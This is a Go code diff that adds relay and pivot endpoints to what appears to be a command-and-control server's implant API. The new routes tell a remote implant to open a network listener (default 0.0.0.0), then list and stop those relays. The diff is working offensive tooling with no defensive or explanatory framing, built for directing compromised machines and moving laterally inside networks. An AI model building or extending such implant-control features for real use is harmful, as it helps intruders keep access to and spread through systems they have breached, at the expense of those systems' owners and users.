@@ -1,6 +1,8 @@
 package main
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"encoding/json"
 	"net/http"
 	"strconv"
@@ -96,9 +98,59 @@ func implantHandler(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		writeJSON(w, http.StatusOK, map[string]string{"task_id": taskID, "status": "sent"})
+	case action == "relay" && r.Method == http.MethodPost:
+		// Start a pivot/relay listener on the implant. The actual bound port
+		// arrives async via the relay_started event (polled via GET .../relays).
+		var body struct {
+			BindIP string `json:"bind_ip"`
+			Port   uint16 `json:"port"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+			http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
+			return
+		}
+		if body.BindIP == "" {
+			body.BindIP = "0.0.0.0"
+		}
+		relayID := newRelayID()
+		if relayRegistry != nil {
+			relayRegistry.Request(id, relayID, body.BindIP, body.Port)
+		}
+		if err := s.Send(serverMsg{Type: "relay_listen", RelayID: relayID, BindIP: body.BindIP, Port: body.Port}); err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+		writeJSON(w, http.StatusOK, map[string]string{"relay_id": relayID, "status": "requested"})
+	case action == "relays" && r.Method == http.MethodGet:
+		var list []RelayInfo
+		if relayRegistry != nil {
+			list = relayRegistry.List(id)
+		}
+		writeJSON(w, http.StatusOK, list)
 	default:
+		// /api/implants/{id}/relays/{rid}  DELETE -> stop one relay
+		if strings.HasPrefix(action, "relays/") && r.Method == http.MethodDelete {
+			rid := strings.TrimPrefix(action, "relays/")
+			if rid == "" {
+				http.Error(w, "relay id required", http.StatusBadRequest)
+				return
+			}
+			if err := s.Send(serverMsg{Type: "relay_stop", RelayID: rid}); err != nil {
+				http.Error(w, err.Error(), http.StatusInternalServerError)
+				return
+			}
+			writeJSON(w, http.StatusOK, map[string]string{"relay_id": rid, "status": "stopping"})
+			return
+		}
 		http.Error(w, "unsupported", http.StatusMethodNotAllowed)
 	}
+}
+
+// newRelayID returns a short hex relay id (mirrors newListenerID).
+func newRelayID() string {
+	var b [4]byte
+	_, _ = rand.Read(b[:])
+	return "rl-" + hex.EncodeToString(b[:])
 }
 
 func writeJSON(w http.ResponseWriter, code int, v interface{}) {
